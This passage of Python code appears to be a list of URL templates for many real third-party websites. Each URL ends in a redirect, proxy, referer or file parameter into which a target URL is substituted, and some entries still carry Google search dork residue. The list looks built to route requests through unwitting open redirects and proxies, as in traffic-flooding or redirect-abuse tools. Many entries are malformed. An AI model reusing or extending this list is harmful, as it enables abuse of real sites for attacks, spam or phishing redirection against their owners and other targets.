			"https://www.koari.net/news/detail.php?id=4739&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFgjoAzBT&amp;usg=AFQjCNGFZdu3GtQWNjcvxfEgbBCHK2v8xwnews/detail.php?ID=%s"%(url),
			"http://trives.cc/gallery/gallery.php?id=%s"%(url),
			"http://www.ecosem.be/fr/products.php?type=%s"%(url),
			"http://www.dembro.nl/products.php?type=%s"%(url),
			"http://www.inderscience.com/dev/search/index.php?action=%s"%(url),
			"http://www.marosa.net/gallery/gallery.php?id=%s"%(url),
			"http://selectautomart.com/view_items.php?id=%s"%(url),
			"https://www.koari.net/news/detail.php?id=4739&amp;sa=U&amp;ved=0ahUKEwiluPiQkJvKAhVGzmMKHRR0ClQQFgjzAzBV&amp;usg=AFQjCNGFZdu3GtQWNjcvxfEgbBCHK2v8xwnews/detail.php?ID=%s"%(url),
			"http://qualitekph.com/blog/products.php?type=%s"%(url),
			"https://www.minzdrav.uz/en/news/detail.php?ID=%s"%(url),
			"http://www.jp-rail.com/products.php?type=%s"%(url),
			"http://www.wasagabeachpark.com/index.php?action=%s"%(url),
			"http://www.liisma.org/index.php?action=%s"%(url),
			"http://yoro49.com/gallery/gallery.php?id=%s"%(url),
			"http://www.dplogin.com/index.php?action=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwjSr8Co7JzKAhWBhBoKHcJbALEQFgifATAZ&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://www.nyis.info/index.php?action=%s"%(url),
			"http://www.mothercare.com.tw/products/products.php?type=%s"%(url),
			"http://www.cellini.com.sg/html/products.php?type=%s"%(url),
			"http://afterbeat.org/index.php?action=%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgh5MBI&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://www.schemehostport.com/2011/11/referer-sic.html&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgjQAjA2&amp;usg=AFQjCNHlr_aBvpeaHoCW_QEjOvh-8_jw2Qreferer=%s"%(url),
			"http://www.microlon.com.au/products/products.php?type=%s"%(url),
			"http://www.simplemachines.org/community/index.php?action=%s"%(url),
			"http://www.xbins.org/index.php?action=%s"%(url),
			"https://wasagabeachpark.dfiner.net/index.php?action=%s"%(url),
			"http://www.eliotours.es/viajes/proxy.php?url=%s"%(url),
			"http://www.rbmodel.com/index.php?action=%s"%(url),
			"http://www.sitepoint.com/forums/showthread.php?215729-Request-ServerVariables(-quot-HTTP-REFERER-quot-)&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgifAzBD&amp;usg=AFQjCNGCO7GLxjwxmy139RxBU_E7ChxGtAreferer=%s"%(url),
			"http://forums.smitegame.com/showthread.php?60316-Add-a-referer-doesn-t-work&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgiSAzBB&amp;usg=AFQjCNGhp4F5xL2tXEuy9BYSTdGd5x-4Ewreferer=%s"%(url),
			"http://www.sailtogether.com/gallery/gallery.php?id=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgiqAjAw&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://cera-gmc.org/index.php?action=%s"%(url),
			"http://ordnet.dk/ddo/ordbog?query=referer&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgjFATAf&amp;usg=AFQjCNHfkmpTA8dxCE4uvtk0-c0vDTE-Qgreferer=%s"%(url),
			"http://webbugtrack.blogspot.com/2008/11/bug-421-ie-fails-to-pass-http-referer.html&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgjsAzBP&amp;usg=AFQjCNHqLa_174X3NuCdHqfZOk7kBP2HTQreferer=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?352029-login-redirect&amp;sa=U&amp;ved=0ahUKEwicn-2q7JzKAhVFvBoKHaqjA74QFgjFBDBh&amp;usg=AFQjCNGwskLTh2eqy-aS2xQfJtb9lKRpNgredirect=%s"%(url),
			"http://ejje.weblio.jp/content/redirect&amp;sa=U&amp;ved=0ahUKEwicn-2q7JzKAhVFvBoKHaqjA74QFgiVATAX&amp;usg=AFQjCNF5t3Qpptj_Lt6AzYIi_2s0Haeqawredirect=%s"%(url),
			"http://content.dynamicmessenger.com/cornerstone/?0DjcXFrxPxxF1rAmlZQQabHNGyFLO7Hl0&http://www.thestar.com/news/gta/article/1264293--openfile-news-website-suspends-publishing-ahead-of-pretty-big-change&amp;sa=U&amp;ved=0ahUKEwiu8fq47JzKAhVBthQKHeoCCQgQFgjjATAk&amp;usg=AFQjCNFuhQarx5FnSDV91RBCR880xvz7Ywopenfile=%s"%(url),
			"http://forum.aurakingdom.to/showthread.php?1182-OpenFIle-Error-for-LoadDB-After-patch&amp;sa=U&amp;ved=0ahUKEwiu8fq47JzKAhVBthQKHeoCCQgQFgj5AzBW&amp;usg=AFQjCNEBg47ULWzcDN8SLwTXuHql9ye6gQopenfile=%s"%(url),
			"http://localnewsresearchproject.ca/2014/10/27/explore-openfile-ca-news-coverage/&amp;sa=U&amp;ved=0ahUKEwiu8fq47JzKAhVBthQKHeoCCQgQFgiXBDBb&amp;usg=AFQjCNGBpF2RJy5FGyf-obC2mrenC4o-GQopenfile=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0ahUKEwjXqoiv7JzKAhUDtRoKHdnmBEcQFgiLAjAv&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
			"http://javascript.ru/forum/dom-window/34810-parent-body-location-href=-pageurl;.html&amp;sa=U&amp;ved=0ahUKEwjXqoiv7JzKAhUDtRoKHdnmBEcQFgiyAzBO&amp;usg=AFQjCNEXsZk3KSGq6_ROZm7mXl03PI1G3Apageurl=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgiSAjAs&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwiu8fq47JzKAhVBthQKHeoCCQgQFghPMAo&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"http://www.airbroumov.eu/index.php?pageurl=%s"%(url),
			"http://www.doe.mass.edu/cms/sites/all/modules/ckeditor_link/proxy.php?url=&amp;sa=U&amp;ved=0ahUKEwj9m8z83qLKAhXIYyYKHX8sAmEQFggtMAc&amp;usg=AFQjCNHMDBPzDM5OmdpL1YLJkcGKgSyJqwproxy.php?=url%s"%(url),
			"http://www.generation-nt.com/open-freely-ouvrir-visualiser-voir-format-fichier-multimedia-telecharger-telechargement-1619632.html?go&amp;sa=U&amp;ved=0ahUKEwiBjL677JzKAhXEOhQKHV_2DgMQFgiaAjAw&amp;usg=AFQjCNFjpfGvVUjOBmonRxr9NS1AXge6lgopen=%s"%(url),
			"http://www.rinstrum.com/products.php?type=%s"%(url),
			"http://www.sssscomic.com/comic.php?page=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?110626-If-referer-is-xxx-then-do-this&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgiEBDBT&amp;usg=AFQjCNHdSX4M3AX78dHIR1MjUxl01UzpJQreferer=%s"%(url),
			"http://it.freepik.com/foto-vettori-gratuito/pagina&amp;sa=U&amp;ved=0ahUKEwiQ6ri_7JzKAhUBtxQKHf-QDRgQFgjyAjBB&amp;usg=AFQjCNEryCTO6YCbF7LGjDBJzP9iN63FWApagina=%s"%(url),
			"http://lyricstranslate.com/en/pagina-bianca-blank-page.html&amp;sa=U&amp;ved=0ahUKEwiQ6ri_7JzKAhUBtxQKHf-QDRgQFgj9AjBD&amp;usg=AFQjCNHqd6kN4oLwutWPS_Obsg-xm1646gpagina=%s"%(url),
			"http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=www.perfectworldtoo.us/redirect.php?url=%s"%(url),
			"http://www.vbforums.com/showthread.php?447907-How-to-open-a-file-using-openfile()-method&amp;sa=U&amp;ved=0ahUKEwiu8fq47JzKAhVBthQKHeoCCQgQFgiRBDBa&amp;usg=AFQjCNG0diFsuyIRg_FwicKWc6d9YzyUBQopenfile=%s"%(url),
			"http://7ba.ru/out.php?url=http://www.salespider.com/redirect/redirect.php?url=%s"%(url),
			"http://wnewspaper.com/el-salvador/13655/La Pagina&amp;sa=U&amp;ved=0ahUKEwiQ6ri_7JzKAhUBtxQKHf-QDRgQFghgMBA&amp;usg=AFQjCNH8q_w_mSiRUDznhFmlSNE8ORzilApagina=%s"%(url),
			"https://www.melanoma.org/find-support/patient-community/mpip-melanoma-patients-information-page&amp;sa=U&amp;ved=0ahUKEwi63au97JzKAhWGaxQKHQfRBHUQFginAzBJ&amp;usg=AFQjCNFG3niVAUsG-gkieGgfD-M1Dz9wJgpage=%s"%(url),
			"http://www.unmaskparasites.com/web-page-options/?url=www.theperfectworld.us/redirect.php?url=%s"%(url),
			"http://www.streetinsider.com/Corporate+News/Cloud+software+maker+Citrix+to+spin+off+GoTo+business,+cut+jobs/11085231.html&amp;sa=U&amp;ved=0ahUKEwiYn_Kz7JzKAhUDxxQKHdrfDr8QFgiuBDBd&amp;usg=AFQjCNGmJSnMfdy6Y9sDuciXQXVqTrtrHwgoto=%s"%(url),
			"http://ejje.weblio.jp/content/referer&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgieAjAu&amp;usg=AFQjCNEFvq_m_E-JTH0JnGOZPvkdnSbAFAreferer=%s"%(url),
			"http://www.rol.ro/dir/mass_media/ziare-si-reviste/cotidiane/pagina-5-a-ziarului-libertatea/visit/&amp;sa=U&amp;ved=0ahUKEwiQ6ri_7JzKAhUBtxQKHf-QDRgQFgixATAf&amp;usg=AFQjCNGRtCA-sDRcdLFsdQN3bogdMzFW4Qpagina=%s"%(url),
			"http://www.diaryclub.com/golink.php?go=http://blog.eduzones.com/redirect.php?url=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwiN8brAzqbKAhWKchQKHS5ICuQQFgiFATAV&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://www.movescount.com/fr/?signin&amp;redirect_uri=%s"%(url),
			"http://business.louisville.edu/cob-it-blog/wp-content/plugins/google-document-embedder/proxy.php?url=http://business.louisville.edu/cob-it-blog/resources/university-email-changes.pdf?1411994341&hl=en_US&gdet=z&embedded=true&amp;sa=U&amp;ved=0ahUKEwj9m8z83qLKAhXIYyYKHX8sAmEQFggUMAA&amp;usg=AFQjCNHPxunTUQ4jIGbAc2c31JefQgrEpQproxy.php?=url%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwjSr8Co7JzKAhWBhBoKHcJbALEQFgh4MBI&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://logicielsgratuits.orange.fr/?noredirect=%s"%(url),
			"http://thechronicleherald.ca/novascotia/141787-openfile-news-site-on-hiatus&amp;sa=U&amp;ved=0ahUKEwiu8fq47JzKAhVBthQKHeoCCQgQFgj4ATAo&amp;usg=AFQjCNEtGDZjYK0JknJDtvwxV1s46mHbxAopenfile=%s"%(url),
			"http://www.autotitre.com/?page=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwjq99HBzqbKAhXGzxQKHdbCC3oQFgiFATAV&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://forums.asp.net/t/1960513.aspx?Http+Referer+Validation&amp;sa=U&amp;ved=0ahUKEwjzoImt7JzKAhXJ2hoKHVvJA2AQFgjdBDBi&amp;usg=AFQjCNEhz4UaYUYJBZRoBMeaCbKc1d7ecAreferer=%s"%(url),
			"http://forums.asp.net/t/770803.aspx?Is+it+possible+to+cast+or+redirect+php+URL+to+asp+URL+&amp;sa=U&amp;ved=0ahUKEwjh2OqS2qXKAhVMSRoKHdL8A_kQFggoMAc&amp;usg=AFQjCNHmRL0VtvSaVqGAgh6j4kKJ_az0YAredirect.php?url=%s"%(url),
			"http://www.prostate-paris.fr/?page=%s"%(url),
			"http://dontknow.me/at/?http://www.macupdate.com/info.php/id/15495&amp;sa=U&amp;ved=0ahUKEwiYqciD96vKAhXDkCwKHZ7rC8YQFgigATAc&amp;usg=AFQjCNFNXXfY8MmvdfhyjrmMkDuSfV20Dginfo.php?ID=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwjk7uuWj7nKAhUBWmMKHQUgB4gQFgiZATAY&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://lovenest.ru/engine/redirect.php?url=%s"%(url),
			"http://blog.jorritsalverda.com/2010/03/maintainable-mvc-post-redirect-get.html&amp;sa=U&amp;ved=0ahUKEwiAtKGYj7nKAhVY02MKHRQVDd0QFgjcAzBN&amp;usg=AFQjCNFQgSIlmN6GsnZMpBzkgjFktFTyEAredirect=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwiN8brAzqbKAhWKchQKHS5ICuQQFgiXATAY&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://www.royalmail.com/track-my-return/pick-a-retailer&amp;sa=U&amp;ved=0ahUKEwj44dPB7JzKAhXJUBQKHQN3CEAQFgiJAzBE&amp;usg=AFQjCNFZrrFZNxtZW25lkFn6VGVydYOKfwreturn=%s"%(url),
			"http://www.schemehostport.com/2011/11/referer-sic.html&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgi0AzBI&amp;usg=AFQjCNHlr_aBvpeaHoCW_QEjOvh-8_jw2Qreferer=%s"%(url),
			"http://redirect.subscribe.ru/inet.search.weboptimization,101152/20110816175107/n/m18201906/-/www.youtube.com/watch?v=r1lVPrYoBkA&feature=channel_video_title&amp;sa=U&amp;ved=0ahUKEwiAtKGYj7nKAhVY02MKHRQVDd0QtwIItgIwMQ&amp;usg=AFQjCNEJnGyZqovfEkhoGXH22DicVowdawredirect=%s"%(url),
			"http://forums.smitegame.com/showthread.php?60316-Add-a-referer-doesn-t-work&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgjUAjA3&amp;usg=AFQjCNGhp4F5xL2tXEuy9BYSTdGd5x-4Ewreferer=%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgiAATAT&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://www.morristown-nj.org/externurl.html?pageurl=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwjq99HBzqbKAhXGzxQKHdbCC3oQFgiXATAY&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgiXAjAt&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://content.dynamicmessenger.com/cornerstone/?0DjcXFrxPxxF1rAmlZQQabHNGyFLO7Hl0&http://www.thestar.com/news/gta/article/1264293--openfile-news-website-suspends-publishing-ahead-of-pretty-big-change&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgjaATAj&amp;usg=AFQjCNFuhQarx5FnSDV91RBCR880xvz7Ywopenfile=%s"%(url),
			"http://yelp.typepad.com/.shared/image.html?/photos/uncategorized/2008/03/28/redir.jpg&amp;sa=U&amp;ved=0ahUKEwjv-uGhj7nKAhVYzGMKHT01CvsQFgibAzBL&amp;usg=AFQjCNHrSZHmwOpJhCctdD3PHt07GFbiDwredir=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwiAod2Dnq_KAhUQ2mMKHXX7DZQQFgiEATAU&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://www.conseil-national.medecin.fr/?url=%s"%(url),
			"http://webbugtrack.blogspot.com/2008/11/bug-421-ie-fails-to-pass-http-referer.html&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgjkAzBQ&amp;usg=AFQjCNHqLa_174X3NuCdHqfZOk7kBP2HTQreferer=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?110626-If-referer-is-xxx-then-do-this&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgiYBDBZ&amp;usg=AFQjCNHdSX4M3AX78dHIR1MjUxl01UzpJQreferer=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgjfAjA5&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://localnewsresearchproject.ca/2014/10/27/explore-openfile-ca-news-coverage/&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgiIBDBZ&amp;usg=AFQjCNGBpF2RJy5FGyf-obC2mrenC4o-GQopenfile=%s"%(url),
			"http://www.perseus.tufts.edu/hopper/morph?l=pagina&la=la&amp;sa=U&amp;ved=0ahUKEwjbwNuqj7nKAhUG8mMKHdv4Ab8QFgiNAjAu&amp;usg=AFQjCNFQ8nI0i5_977AMk-Oc5LxVOxYHcwpagina=%s"%(url),
			"http://forum.aurakingdom.to/showthread.php?1182-OpenFIle-Error-for-LoadDB-After-patch&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgiYAzBF&amp;usg=AFQjCNEBg47ULWzcDN8SLwTXuHql9ye6gQopenfile=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgiYATAX&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"http://killtube.org/showthread.php?1566-CoD4-openfile&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgiqBDBg&amp;usg=AFQjCNFIslISkcPfobQ34UE-B-c8Dq5L6Aopenfile=%s"%(url),
			"http://www.nullrefer.com/?http://www.ddmf.eu/product.php?id=3&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgjaATAj&amp;usg=AFQjCNHNDqJqrftS3U3WCg6-ypSpjms3Dginurl:product.php?id=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0ahUKEwio-4Ccj7nKAhUW52MKHYctBpgQFgiKAjAu&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
			"http://lyricstranslate.com/en/pagina-bianca-blank-page.html&amp;sa=U&amp;ved=0ahUKEwjbwNuqj7nKAhUG8mMKHdv4Ab8QFgiDAzBC&amp;usg=AFQjCNHqd6kN4oLwutWPS_Obsg-xm1646gpagina=%s"%(url),
			"http://forums.asp.net/t/886708.aspx?Is+there+a+way+to+remove+the+returnUrl+querystring+&amp;sa=U&amp;ved=0ahUKEwi9xerq65_KAhWENiYKHTNhA-AQFgg8MAY&amp;usg=AFQjCNH-VJhpcjC8FToCFQi99gqesx4ulwreturnUrl=%s"%(url),
			"http://www.doe.mass.edu/cms/sites/all/modules/ckeditor_link/proxy.php?url=&amp;sa=U&amp;ved=0ahUKEwiL5b3JvMLKAhWMWRQKHRl7CsMQFgg9MAs&amp;usg=AFQjCNHMDBPzDM5OmdpL1YLJkcGKgSyJqwinurl:proxy.php?url=%s"%(url),
			"http://lucasmeyercosmetics.com/en/products/product.php?id=66&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgiZAjAu&amp;usg=AFQjCNHYxSCyyMYn-S9rKZ6qw7urko9Yzwinurl:product.php?id=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwjk7uuWj7nKAhUBWmMKHQUgB4gQFgh8MBM&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://jump.2ch.net/?img.theqoo.net/proxy.php?url=i.imgur.com/eC8KhIn.jpg&amp;sa=U&amp;ved=0ahUKEwiL5b3JvMLKAhWMWRQKHRl7CsMQFgh5MBo&amp;usg=AFQjCNEx2GurN16DN3lQoLZ42k8Oj9DXyginurl:proxy.php?url=%s"%(url),
			"http://forums.asp.net/t/1960513.aspx?Http+Referer+Validation&amp;sa=U&amp;ved=0ahUKEwjgsdqZj7nKAhVF62MKHb9SC84QFgjTBDBj&amp;usg=AFQjCNEhz4UaYUYJBZRoBMeaCbKc1d7ecAreferer=%s"%(url),
			"http://www.vbforums.com/showthread.php?447907-How-to-open-a-file-using-openfile()-method&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgj1AzBW&amp;usg=AFQjCNG0diFsuyIRg_FwicKWc6d9YzyUBQopenfile=%s"%(url),
			"http://jump.2ch.net/?img.theqoo.net/proxy.php?url=i.imgur.com/DI3aOXI.jpg&amp;sa=U&amp;ved=0ahUKEwiL5b3JvMLKAhWMWRQKHRl7CsMQFgh0MBk&amp;usg=AFQjCNHISDAq-lxapGfXq2h1jtGJj942BQinurl:proxy.php?url=%s"%(url),
			"http://www.movescount.com/?redirect_uri=%s"%(url),
			"http://www.redrockbg.com/product.php?id=1437&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgjXAjA5&amp;usg=AFQjCNHmn2f6qt7U_-Tvlp7WKua6fxxv_winurl:product.php?id=%s"%(url),
			"http://jump.2ch.net/?img.theqoo.net/proxy.php?url=i.imgur.com/Iv2GN5U.jpg&amp;sa=U&amp;ved=0ahUKEwiL5b3JvMLKAhWMWRQKHRl7CsMQFghvMBg&amp;usg=AFQjCNGR3OAqPM8-wdqldstS6tpN9utg2ginurl:proxy.php?url=%s"%(url),
			"http://business.louisville.edu/cob-it-blog/wp-content/plugins/google-document-embedder/proxy.php?url=http://business.louisville.edu/cob-it-blog/resources/university-email-changes.pdf?1411994341&hl=en_US&gdet=z&embedded=true&amp;sa=U&amp;ved=0ahUKEwiL5b3JvMLKAhWMWRQKHRl7CsMQFggUMAA&amp;usg=AFQjCNHPxunTUQ4jIGbAc2c31JefQgrEpQinurl:proxy.php?url=%s"%(url),
			"http://omahkain.com/search/AngularJS+and+Google+OAuth2+redirect_uri+++Stack+Overflow/&amp;sa=U&amp;ved=0ahUKEwjk7uuWj7nKAhUBWmMKHQUgB4gQFgjvAzBZ&amp;usg=AFQjCNFm4wl8QKlRRvvJnCVZL2pCcHEuRwredirect_uri=%s"%(url),
			"http://www.balitreetop.com/?goto=%s"%(url),
			"http://www.shinobi.jp/etc/goto.html?http://jigsaw.w3.org/css-validator/validator?uri=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwjrw9vL0e7KAhUS72MKHQipBIoQFgiGATAU&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://engagethepower.org/wp-content/plugins/google-document-embedder/proxy.php?url=http://engagethepower.org/wp-content/uploads/Activity-Summary-Draft-1.pdf&hl=en_US&embedded=true&amp;sa=U&amp;ved=0ahUKEwjjg67smdPKAhVG2qYKHdnDD64QFghSMAw&amp;usg=AFQjCNEghPpHNVx14H8FNvdyTXD71Mdv9gproxy.php?url=1%s"%(url),
			"http://www.chudakov.net/goto.php?numgoto=%s"%(url),
			"http://blog.jorritsalverda.com/2010/03/maintainable-mvc-post-redirect-get.html&amp;sa=U&amp;ved=0ahUKEwjHorHO0e7KAhUT3mMKHRjVBDoQFgjKAzBM&amp;usg=AFQjCNFQgSIlmN6GsnZMpBzkgjFktFTyEAredirect=%s"%(url),
			"http://www.mic-w.com/product.php?id=3&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgjlATAl&amp;usg=AFQjCNGbo744HEmEo6QfwQNzjOeVBeHkJwinurl:product.php?id=%s"%(url),
			"http://omahkain.com/search/google+oauth2+redirect_uri+with+several+parameters+++Stack+Overflow/&amp;sa=U&amp;ved=0ahUKEwjk7uuWj7nKAhUBWmMKHQUgB4gQFgjqAzBY&amp;usg=AFQjCNGSUfOIrwwvONA28-zLhh74MGyNrAredirect_uri=%s"%(url),
			"http://thechronicleherald.ca/novascotia/141787-openfile-news-site-on-hiatus&amp;sa=U&amp;ved=0ahUKEwiDtpCkj7nKAhUJ4WMKHc7YAlAQFgjyATAn&amp;usg=AFQjCNEtGDZjYK0JknJDtvwxV1s46mHbxAopenfile=%s"%(url),
			"http://forums.asp.net/t/1159904.aspx?logoff+problem+how+to+remove+ReturnUrl+after+logoff+&amp;sa=U&amp;ved=0ahUKEwii-dmSobnKAhVJ2R4KHWRsDeMQFggoMAM&amp;usg=AFQjCNG7wypS1NAmLAORdhGV2xu8pPMnOwreturnUrl=%s"%(url),
			"http://forums.smitegame.com/showthread.php?60316-Add-a-referer-doesn-t-work&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgjsAjA7&amp;usg=AFQjCNGhp4F5xL2tXEuy9BYSTdGd5x-4Ewreferer=%s"%(url),
			"http://www.schemehostport.com/2011/11/referer-sic.html&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgicBDBY&amp;usg=AFQjCNHlr_aBvpeaHoCW_QEjOvh-8_jw2Qreferer=%s"%(url),
			"http://www.youthlight.com/product.php?id=2994&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgjuAzBU&amp;usg=AFQjCNFSoOzbn_Iz4yC3pmeki7i-lD6-UAinurl:product.php?id=%s"%(url),
			"http://www.xmarks.com/site/reviews/1/people.asl.com.hk/ETWeb/System/LoginProvider/LoginProvider.asp?PageURL=/ETWeb/Defaultasp&amp;sa=U&amp;ved=0ahUKEwjyrojS0e7KAhVH_WMKHRdEAKYQFgj9AzBd&amp;usg=AFQjCNGvIcbKuDXaS-s3ycjoOtvY7wv05Apageurl=%s"%(url),
			"http://www.sitepoint.com/forums/showthread.php?215729-Request-ServerVariables(-quot-HTTP-REFERER-quot-)&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgi2AzBI&amp;usg=AFQjCNGCO7GLxjwxmy139RxBU_E7ChxGtAreferer=%s"%(url),
			"http://ajaxnetworksolutions.com/pages/wp-content/plugins/google-document-embedder/proxy.php?url=http://ajaxnetworksolutions.com/pages/wp-content/themes/Phenomenon_v1.1/downloads/DataSheets/CyberoamCR25wi.pdf&hl=en_US&gdet=&embedded=true&amp;sa=U&amp;ved=0ahUKEwjjg67smdPKAhVG2qYKHdnDD64QFgijAjA5&amp;usg=AFQjCNFtbr3Bm35aUD7xGH7d5mStSuLnvwproxy.php?url=1%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgiKATAU&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://www.conceptronic.net/product.php?id=703&linkid=683&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgioAzBI&amp;usg=AFQjCNGEdT4_DK8MDkfJ1OJrqVqY9XmWEAinurl:product.php?id=%s"%(url),
